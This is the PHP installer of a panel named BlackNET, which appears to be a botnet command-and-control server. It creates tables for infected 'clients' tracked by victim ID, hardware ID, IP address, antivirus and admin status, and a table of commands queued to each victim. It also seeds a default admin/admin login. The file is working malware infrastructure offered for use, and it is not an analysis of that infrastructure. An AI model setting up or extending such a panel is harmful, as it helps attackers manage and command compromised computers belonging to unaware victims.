<?php
include_once 'classes/Database.php';
include_once APP_PATH . '/classes/Update.php';
include_once APP_PATH . '/classes/Utils.php';

$utils = new Utils;

$install = new Update;

$required_libs = ["cURL" => "curl", "JSON" => "json", "PDO" => "pdo", "MySQL" => "pdo_mysql", "Mbstring" => "mbstring"];
$is_installed = [];

if ($_SERVER['REQUEST_METHOD'] === "POST") {
    $admin = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["username", 'text', 'NULL'],
        ["password", 'text', 'NULL'],
        ["email", 'text', 'NULL'],
        ["role", 'varchar(50)', 'NULL'],
        ["s2fa", 'varchar(10)', 'NULL'],
        ["secret", 'varchar(50)', 'NULL'],
        ["sqenable", 'varchar(50)', 'NULL'],
        ["question", 'text', 'NULL'],
        ["answer", 'text', 'NULL'],
        ['last_login', 'timestamp', 'NULL', "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
        ["failed_login", "int(11)", "NULL"],
    ];

    $clients = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["vicid", 'text', 'NULL'],
        ["hwid", 'text', 'NULL'],
        ["ipaddress", 'text', 'NULL'],
        ["computername", 'text', 'NULL'],
        ["country", 'text', 'NULL'],
        ["os", 'text', 'NULL'],
        ["insdate", 'text', 'NULL'],
        ["update_at", 'text', 'NULL'],
        ["pings", 'int(11)', 'NULL'],
        ['antivirus', 'text', 'NULL'],
        ['version', 'text', 'NULL'],
        ['status', 'text', 'NULL'],
        ['is_usb', 'varchar(5)', 'NULL'],
        ["is_admin", 'varchar(5)', "NULL"],
    ];

    $commands = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["vicid", 'text', 'NULL'],
        ["command", 'text', 'NULL'],
    ];

    $confirm_code = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["username", 'text', 'NULL'],
        ["token", 'text', 'NULL'],
        ["created_at", 'timestamp', 'NULL', "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
    ];

    $logs = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["time", 'timestamp', 'NULL', "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
        ["vicid", 'text', 'NULL'],
        ["type", 'text', 'NULL'],
        ["message", 'text', 'NULL'],
    ];

    $settings = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["recaptchaprivate", 'text', 'NULL'],
        ["recaptchapublic", 'text', 'NULL'],
        ["recaptchastatus", 'text', 'NULL'],
        ["panel_status", 'text', 'NULL'],
    ];

    $smtp = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["smtphost", 'text', 'NULL'],
        ["smtpuser", 'text', 'NULL'],
        ["smtppassword", 'text', 'NULL'],
        ["port", 'int(11)', 'NULL'],
        ["security_type", 'varchar(10)', 'NULL'],
        ["status", 'varchar(50)', 'NULL'],
    ];

    $sql = [
        $install->create_table("admin", $admin),
        $install->create_table("clients", $clients),
        $install->create_table("commands", $commands),
        $install->create_table("confirm_code", $confirm_code),
        $install->create_table("logs", $logs),
        $install->create_table("settings", $settings),
        $install->create_table("smtp", $smtp),
        $install->insert_value("admin", [
            "id" => 1,
            "username" => 'admin',
            "password" => password_hash("admin", PASSWORD_BCRYPT),
            "email" => 'localhost@gmail.com',
            "role" => 'administrator',
            "s2fa" => 'off',
            "secret" => 'null',
            "sqenable" => 'off',
            "question" => 'Select a Security Question',
            "answer" => '',
            "last_login" => "2020-05-11 01:19:22",
            "failed_login" => 0,
        ]),
        $install->insert_value("settings", [
            "id" => 1,
            "recaptchaprivate" => 'UpdateYourCode',
            "recaptchapublic" => 'UpdateYourCode',
            "recaptchastatus" => 'off',
            "panel_status" => 'on',
        ]),
        $install->insert_value("smtp", [
            "id" => 1,
            "smtphost" => 'smtp.localhost.com',
            "smtpuser" => 'localhost@gmail.com',
            "smtppassword" => 'Z21haWxwYXNzd29yZA==',
            "port" => 0,
            "security_type" => 'ssl',
            "status" => 'off',
        ]),
        $install->is_primary("admin", "id"),
        $install->is_autoinc("admin", ["id", 'int(11)', 'unsigned', 'NULL']),
        $install->is_primary("clients", "id"),
        $install->is_autoinc("clients", ["id", 'int(11)', 'unsigned', 'NULL']),
        $install->is_primary("commands", "id"),
        $install->is_autoinc("commands", ["id", 'int(11)', 'unsigned', 'NULL']),
        $install->is_primary("confirm_code", "id"),
        $install->is_autoinc("confirm_code", ["id", 'int(11)', 'unsigned', 'NULL']),
        $install->is_primary("logs", "id"),
        $install->is_autoinc("logs", ["id", 'int(11)', 'unsigned', 'NULL']),
        $install->is_primary("settings", "id"),
        $install->is_autoinc("settings", ["id", 'int(11)', 'unsigned', 'NULL']),
        $install->is_primary("smtp", "id"),
        $install->is_autoinc("smtp", ["id", 'int(11)', 'unsigned', 'NULL']),
    ];

    foreach ($sql as $query) {
        $msg = $install->execute($query);
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <?php include_once 'components/meta.php';?>
  <title>BlackNET - Installation</title>
  <?php include_once 'components/css.php';?>
</head>

<body class="bg-dark">
  <div class="container pt-3">
    <div class="card card-login mx-auto mt-5">
      <div class="card-header">Install</div>
      <div class="card-body">
        <form method="POST">
          <?php if (isset($msg)): ?>
            <?php $utils->show_alert("Panel has been installed.", "success", "check-circle");?>
          <?php endif;?>
          <div class="alert alert-primary text-center border-primary">
            <p class="lead h2">
              <b>this page going to install BlackNET default settings<br>
                <hr>
                <div>
                <?php foreach ($required_libs as $common_name => $lib_name): ?>
                <?php echo $common_name . ": ", extension_loaded($lib_name) ? "OK" : "Missing", "<br />"; ?>
                <?php array_push($is_installed, extension_loaded($lib_name));?>
                <?php endforeach;?>
                </div>
                <hr>
                <p class="h3">admin login details</p>
                <ul class="list-unstyled h4">
                  <li class="">Username: admin</li>
                  <li class="">Password: admin</li>
                </ul>
                <hr />
                <p>Please change the admin information for better security.</p>
              </b></p>
          </div>
          <?php if (in_array(false, $is_installed)): ?>
          <button type="submit" class="btn btn-primary btn-block" disabled>Start Installation</button>
          <?php else: ?>
          <button type="submit" class="btn btn-primary btn-block">Start Installation</button>
          <?php endif;?>
        </form>
      </div>
    </div>
  </div>
  <?php include_once 'components/js.php';?>

</body>

</html>
